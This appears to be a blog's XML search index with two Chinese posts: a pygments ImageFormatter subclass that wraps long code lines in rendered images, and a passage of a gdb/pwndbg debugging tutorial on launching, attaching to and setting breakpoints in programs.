<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pygments代码高亮库生成图片实现自动换行</title>
      <link href="/2025/09/17/pygments%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%BA%93%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C/"/>
      <url>/2025/09/17/pygments%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%BA%93%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>最近碰见了这样一个需求，需要使用pyments对代码进行高亮并生成图片，但是存在生成的代码图片没有行数限制的问题，于是我自己重新改写了image formatter规则。</p><h2 id="重写的类"><a href="#重写的类" class="headerlink" title="重写的类"></a>重写的类</h2><p>以下带代码可能在pyright出现报错，但不影响运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LineBreakFormatter</span>(<span class="title class_ inherited__">ImageFormatter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **options</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(**options)</span><br><span class="line">        <span class="comment"># 每行最大字符数（0 或未设置表示不启用字符数换行）</span></span><br><span class="line">        self.max_chars_per_line = <span class="built_in">int</span>(options.get(<span class="string">&quot;max_chars_per_line&quot;</span>, <span class="number">0</span>) <span class="keyword">or</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">format</span>(<span class="params">self, tokensource, outfile</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Format ``tokensource``, an iterable of ``(tokentype, tokenstring)``</span></span><br><span class="line"><span class="string">        tuples and write it into ``outfile``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        This implementation calculates where it should draw each token on the</span></span><br><span class="line"><span class="string">        pixmap, then calculates the required pixmap size and draws the items.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        line_break_map = self._create_drawables(tokensource)</span><br><span class="line">        logger.debug(<span class="string">f&quot;Line break map: <span class="subst">&#123;line_break_map&#125;</span>&quot;</span>)</span><br><span class="line">        self._draw_line_numbers(line_break_map)</span><br><span class="line">        sizex, sizey = self._get_image_size(self.maxlinelength, self.maxlineno)</span><br><span class="line">        im = Image.new(</span><br><span class="line">            <span class="string">&quot;RGB&quot;</span>,</span><br><span class="line">            (sizex + <span class="number">200</span>, sizey),</span><br><span class="line">            self.background_color,</span><br><span class="line">        )</span><br><span class="line">        self._paint_line_number_bg(im)</span><br><span class="line">        draw = ImageDraw.Draw(im)</span><br><span class="line">        <span class="comment"># Highlight</span></span><br><span class="line">        <span class="keyword">if</span> self.hl_lines:</span><br><span class="line">            x = self.image_pad + self.line_number_width - self.line_number_pad + <span class="number">1</span></span><br><span class="line">            recth = self._get_line_height()</span><br><span class="line">            rectw = im.size[<span class="number">0</span>] - x</span><br><span class="line">            <span class="keyword">for</span> linenumber <span class="keyword">in</span> self.hl_lines:</span><br><span class="line">                y = self._get_line_y(linenumber - <span class="number">1</span>)</span><br><span class="line">                draw.rectangle([(x, y), (x + rectw, y + recth)], fill=self.hl_color)</span><br><span class="line">        <span class="keyword">for</span> pos, value, font, text_fg, text_bg <span class="keyword">in</span> self.drawables:</span><br><span class="line">            <span class="keyword">if</span> text_bg:</span><br><span class="line">                <span class="comment"># see deprecations https://pillow.readthedocs.io/en/stable/releasenotes/9.2.0.html#font-size-and-offset-methods</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hasattr</span>(draw, <span class="string">&quot;textsize&quot;</span>):</span><br><span class="line">                    text_size = draw.textsize(text=value, font=font)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    text_size = font.getbbox(value)[<span class="number">2</span>:]</span><br><span class="line">                draw.rectangle(</span><br><span class="line">                    [pos[<span class="number">0</span>], pos[<span class="number">1</span>], pos[<span class="number">0</span>] + text_size[<span class="number">0</span>], pos[<span class="number">1</span>] + text_size[<span class="number">1</span>]],</span><br><span class="line">                    fill=text_bg,</span><br><span class="line">                )</span><br><span class="line">            draw.text(pos, value, font=font, fill=text_fg)</span><br><span class="line">        im.save(outfile, self.image_format.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_draw_line_numbers</span>(<span class="params">self, is_line_break: <span class="type">List</span>[<span class="built_in">bool</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create drawables for the line numbers.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.line_numbers:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_line_break:</span><br><span class="line">            is_line_break = [<span class="literal">False</span>] * (self.maxlineno + <span class="number">1</span>)</span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> p, t <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(self.maxlineno), is_line_break):</span><br><span class="line">            <span class="keyword">if</span> t:</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (n % self.line_number_step) == <span class="number">0</span>:</span><br><span class="line">                    self._draw_linenumber(p, n)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._draw_linenumber(p, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_create_drawables</span>(<span class="params">self, tokensource</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">bool</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create drawables for the token content.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        lineno = <span class="number">0</span></span><br><span class="line">        charno = <span class="number">0</span></span><br><span class="line">        maxcharno = <span class="number">0</span></span><br><span class="line">        maxlinelength = <span class="number">0</span></span><br><span class="line">        linelength = <span class="number">0</span></span><br><span class="line">        is_line_break = [<span class="literal">True</span>]</span><br><span class="line">        <span class="keyword">for</span> ttype, value <span class="keyword">in</span> tokensource:</span><br><span class="line">            <span class="keyword">while</span> ttype <span class="keyword">not</span> <span class="keyword">in</span> self.styles:</span><br><span class="line">                ttype = ttype.parent</span><br><span class="line">            style = self.styles[ttype]</span><br><span class="line">            <span class="comment"># <span class="doctag">TODO:</span> make sure tab expansion happens earlier in the chain.  It</span></span><br><span class="line">            <span class="comment"># really ought to be done on the input, as to do it right here is</span></span><br><span class="line">            <span class="comment"># quite complex.</span></span><br><span class="line">            value = value.expandtabs(<span class="number">4</span>)</span><br><span class="line">            lines = value.splitlines(<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">                temp = line.rstrip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">while</span> temp:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> self.max_chars_per_line:</span><br><span class="line">                        chunk = temp</span><br><span class="line">                        temp = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        remaining = self.max_chars_per_line - charno</span><br><span class="line">                        <span class="keyword">if</span> remaining &lt;= <span class="number">0</span>:</span><br><span class="line">                            <span class="comment"># 软换行：进入新行</span></span><br><span class="line">                            linelength = <span class="number">0</span></span><br><span class="line">                            charno = <span class="number">0</span></span><br><span class="line">                            lineno += <span class="number">1</span></span><br><span class="line">                            is_line_break.append(<span class="literal">False</span>)</span><br><span class="line">                            remaining = self.max_chars_per_line</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(temp) &gt; remaining:</span><br><span class="line">                            chunk, temp = temp[:remaining], temp[remaining:]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            chunk, temp = temp, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> chunk:</span><br><span class="line">                        self._draw_text(</span><br><span class="line">                            self._get_text_pos(linelength, lineno),</span><br><span class="line">                            chunk,</span><br><span class="line">                            font=self._get_style_font(style),</span><br><span class="line">                            text_fg=self._get_text_color(style),</span><br><span class="line">                            text_bg=self._get_text_bg_color(style),</span><br><span class="line">                        )</span><br><span class="line">                        chunk_width, _ = self.fonts.get_text_size(chunk)</span><br><span class="line">                        linelength += chunk_width</span><br><span class="line">                        maxlinelength = <span class="built_in">max</span>(maxlinelength, linelength)</span><br><span class="line">                        charno += <span class="built_in">len</span>(chunk)</span><br><span class="line">                        maxcharno = <span class="built_in">max</span>(maxcharno, charno)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> line.endswith(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">                    <span class="comment"># 源文本的硬换行</span></span><br><span class="line">                    linelength = <span class="number">0</span></span><br><span class="line">                    charno = <span class="number">0</span></span><br><span class="line">                    lineno += <span class="number">1</span></span><br><span class="line">                    is_line_break.append(<span class="literal">True</span>)</span><br><span class="line">        self.maxlinelength = maxlinelength</span><br><span class="line">        self.maxcharno = maxcharno</span><br><span class="line">        self.maxlineno = lineno</span><br><span class="line">        <span class="keyword">return</span> is_line_break</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>如果你之前的代码是这这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FMT_CONFIG = &#123;</span><br><span class="line">    <span class="string">&quot;font_name&quot;</span>: <span class="string">&quot;DejaVu Sans Mono&quot;</span>,</span><br><span class="line">    <span class="string">&quot;style&quot;</span>: <span class="string">&quot;sas&quot;</span>,</span><br><span class="line">    <span class="string">&quot;line_pad&quot;</span>: <span class="number">40</span>,</span><br><span class="line">    <span class="string">&quot;font_size&quot;</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="string">&quot;line_number_pad&quot;</span>: <span class="number">10</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt_config = DEFAULT_FMT_CONFIG.copy()</span><br><span class="line">code = /*代码*/</span><br><span class="line">code_type = /*代码语言*/</span><br><span class="line"><span class="keyword">if</span> extra_fmt:</span><br><span class="line">    fmt_config.update(extra_fmt)</span><br><span class="line">lexer = get_lexer_by_name(code_type)</span><br><span class="line">formatter = ImageFormatter(**fmt_config)</span><br><span class="line">highlighted_code = highlight(code, lexer, formatter)</span><br><span class="line">image_path = <span class="string">f&quot;code_<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">fw.write(highlighted_code)</span><br></pre></td></tr></table></figure><p>只需要修改为以下格式即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FMT_CONFIG = &#123;</span><br><span class="line">    <span class="string">&quot;font_name&quot;</span>: <span class="string">&quot;DejaVu Sans Mono&quot;</span>,</span><br><span class="line">    <span class="string">&quot;style&quot;</span>: <span class="string">&quot;sas&quot;</span>,</span><br><span class="line">    <span class="string">&quot;line_pad&quot;</span>: <span class="number">40</span>,</span><br><span class="line">    <span class="string">&quot;font_size&quot;</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="string">&quot;line_number_pad&quot;</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="string">&quot;max_chars_per_line&quot;</span>: <span class="number">80</span>,<span class="comment">#添加最大单行代码限制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt_config = DEFAULT_FMT_CONFIG.copy()</span><br><span class="line">code =/*代码*/</span><br><span class="line">code_type = /*代码语言*/</span><br><span class="line"><span class="keyword">if</span> extra_fmt:</span><br><span class="line">    fmt_config.update(extra_fmt)</span><br><span class="line">lexer = get_lexer_by_name(code_type)</span><br><span class="line">formatter = LineBreakFormatter(**fmt_config) <span class="comment">#替换为新加的formatter</span></span><br><span class="line">highlighted_code = highlight(code, lexer, formatter)</span><br><span class="line">image_path = <span class="string">f&quot;code_<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">fw.write(highlighted_code)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb超全指令教程</title>
      <link href="/2025/09/10/gdb%E8%B6%85%E5%85%A8%E6%8C%87%E4%BB%A4%E6%95%99%E7%A8%8B/"/>
      <url>/2025/09/10/gdb%E8%B6%85%E5%85%A8%E6%8C%87%E4%BB%A4%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB-支持的语言"><a href="#GDB-支持的语言" class="headerlink" title="GDB 支持的语言"></a>GDB 支持的语言</h1><p>Ada，Assembly，C，C++，D，Fortran，Haskell，Go，Objective-C，OpenCL C，Modula-2，Pascal，Rust。</p><h1 id="gdb实现原理"><a href="#gdb实现原理" class="headerlink" title="gdb实现原理"></a>gdb实现原理</h1><h3 id="调试器与进程建立联系"><a href="#调试器与进程建立联系" class="headerlink" title="调试器与进程建立联系"></a>调试器与进程建立联系</h3><p>使用linux中ptrace()系统调用</p><p>使用时会建立ptracer和ptracee关系，从而进行交互。</p><h3 id="软断点"><a href="#软断点" class="headerlink" title="软断点"></a>软断点</h3><p>gdb通过对代码进行修改，将目标代码修改为0xcc程序码，触发一个调试终端，发送sigtrap信号然后程序暂停执行，调试器接收到信号后，把0xcc恢复，然后将pc指针回退一步，等待进一步指令，如果不取消断点，执行完当前命令后，Tracer又会重新插入</p><h1 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h1><h2 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;register&#125; #代表使用该寄存器地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#123;address&#125; #该地址指向的值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;num&#125;x #16进制数字</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!&#123;command&#125;#在进入路径处执行命令，但不能使用cd等改变gdb目标地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 在‘#’进行注释</span><br></pre></td></tr></table></figure><h2 id="gdb启动程序"><a href="#gdb启动程序" class="headerlink" title="gdb启动程序"></a>gdb启动程序</h2><p>gdb要跟踪程序存在三种方法</p><h3 id="gdb中加载"><a href="#gdb中加载" class="headerlink" title="gdb中加载"></a>gdb中加载</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>简单调试易于使用</li><li>可以在main或_start函数前下断点</li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ol><li>默认未开启ASLR随机化</li><li>启动行为存在差异</li><li>内存布局存在差异</li><li>环境变量纯在差异</li></ol><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ol><li><p>打开gdb时设置参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -q &quot;./pwn&quot; #无参数</span><br><span class="line">gdb -ex &quot;run&quot; --args 【文件名】 【参数1】 【参数2】...</span><br></pre></td></tr></table></figure><p>这里延申一下， -ex指令可以实现进入后执行引号内的命令</p></li><li><p>进入gdb中进行调用</p><ol><li><p>设置程序文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 【文件名】</span><br></pre></td></tr></table></figure></li><li><p>设置参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args 【参数1】 【参数2】...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args # 清空参数</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="attach附加进程"><a href="#attach附加进程" class="headerlink" title="attach附加进程"></a>attach附加进程</h3><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol><li>环境和远程靶机相似性高<ol><li>默认开启ASLR地址随机化</li><li>启动行为基本一致</li><li>环境变量基本一致</li><li>内存布局基本一致</li></ol></li><li>调试结束后不影响程序进行</li></ol><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>程序交互前无法下断点</p><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; attach 【PID】</span><br></pre></td></tr></table></figure><h3 id="gdbserver用过网络协议调试"><a href="#gdbserver用过网络协议调试" class="headerlink" title="gdbserver用过网络协议调试"></a>gdbserver用过网络协议调试</h3><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ol><li>跨机器调试</li><li>使用docker启动gdbserver调试</li><li>与IDA Pro等联动调试</li></ol><h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ol><li>程序交互麻烦</li><li>程序启动不方便</li></ol><h4 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h4><p>靶机（gdbserver）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【port】 【文件】【参数1】 【参数2】</span><br></pre></td></tr></table></figure><p>主机（gdb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote：【IP】:【port】</span><br></pre></td></tr></table></figure><ul><li>默认监听0.0.0.0</li><li>target remote默认连接localhost</li></ul><h2 id="退出和日志"><a href="#退出和日志" class="headerlink" title="退出和日志"></a>退出和日志</h2><h3 id="退出GDB"><a href="#退出GDB" class="headerlink" title="退出GDB"></a>退出GDB</h3><p>直接关闭进程退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure><h3 id="关闭进程"><a href="#关闭进程" class="headerlink" title="关闭进程"></a>关闭进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill </span><br></pre></td></tr></table></figure><h3 id="断开附加"><a href="#断开附加" class="headerlink" title="断开附加"></a>断开附加</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">detach</span><br></pre></td></tr></table></figure><h3 id="暂停（终止）进程查看面板"><a href="#暂停（终止）进程查看面板" class="headerlink" title="暂停（终止）进程查看面板"></a>暂停（终止）进程查看面板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + C</span><br></pre></td></tr></table></figure><h3 id="记录日志"><a href="#记录日志" class="headerlink" title="记录日志"></a>记录日志</h3><p>开启记录设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set logging on</span><br></pre></td></tr></table></figure><p>关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set logging on</span><br></pre></td></tr></table></figure><h2 id="面板介绍"><a href="#面板介绍" class="headerlink" title="面板介绍"></a>面板介绍</h2><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407cc5df7.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407cc5df7.png" alt="image-20240429190809526.png"></a></p><h3 id="调试信息"><a href="#调试信息" class="headerlink" title="调试信息"></a>调试信息</h3><p>载入的源文件·</p><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407b6933d.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407b6933d.png" alt="image-20240429190947729.png"></a></p><p>这一段是固定的</p><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407b4928f.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407b4928f.png" alt="image-20240429191044779.png"></a></p><p>它说明了各种数据对应的颜色，方便分别下方数据</p><ul><li>黄色：栈中数据（栈段）</li><li>蓝色：堆中数据</li><li>红色：代码段数据</li><li>紫色：数据段数据</li><li>下划线：可读可写可执行的数据</li><li>白色：只读</li></ul><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407bbb6a0.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407bbb6a0.png" alt="image-20240429191739279.png"></a></p><ul><li>寄存器名称</li><li>寄存器储存数据</li><li>解引用的数据</li></ul><p><strong>向右箭头代表可以继续解引用的数据，想左代表不能继续解引用</strong></p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407b93803.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407b93803.png" alt="image-20240429192045856.png"></a></p><ul><li>程序运行到当前的地址&lt;对应当前函数编译地址&gt;</li><li>反汇编指令</li></ul><p>绿色代表执行到的位置</p><h3 id="栈帧信息"><a href="#栈帧信息" class="headerlink" title="栈帧信息"></a>栈帧信息</h3><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407b900ff.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407b900ff.png" alt="image-20240429192645761.png"></a></p><ul><li>相对于sp的偏移&#x2F;8（序号）: 16进制的偏移量 （默认为+）</li><li>相对于rbp的偏移</li><li>bp的地址</li><li>数据</li></ul><h3 id="调用循序（系统栈）"><a href="#调用循序（系统栈）" class="headerlink" title="调用循序（系统栈）"></a>调用循序（系统栈）</h3><p><a href="https://www.helloimg.com/i/2025/09/10/68c1407e2bcdc.png"><img src="https://www.helloimg.com/i/2025/09/10/68c1407e2bcdc.png" alt="image-20240429193514357.png"></a></p><p>上下之间的关系是callee-&gt;caller的关系</p><p>最下方是最开始的函数，最上方为当前函数</p><h2 id="点"><a href="#点" class="headerlink" title="点"></a>点</h2><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>指定程序在执行过程中的某个特定点暂停执行。调试器可以检测此时程序状态，包括变量的值执行路径等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break 或 b #当前pc处断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break &#123;function&#125; 或 b在函数function处下断点，会搜索所有符号并断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break *&#123;address&#125; #在地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break X.c &#123;lines&#125; #在源码X.c文件的lines处下断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tbreak &#123;express&#125; 或 tb #设置临时断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbreak &#123;regexpr&#125; 或rb #设置满足正则匹配的所有断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hbreak  &#123;expr&#125; 或 hb #使用硬件断点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition &#123;id&#125; &#123;expr&#125; #设置id条件断点，只要条件生效时才发生</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break &#123;exp&#125; if &#123;cond&#125; #设置条件断点，只要满足条件时才方式</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info breakpoints 或 info b #显示所有断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete &#123;id&#125; #删除id的断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete 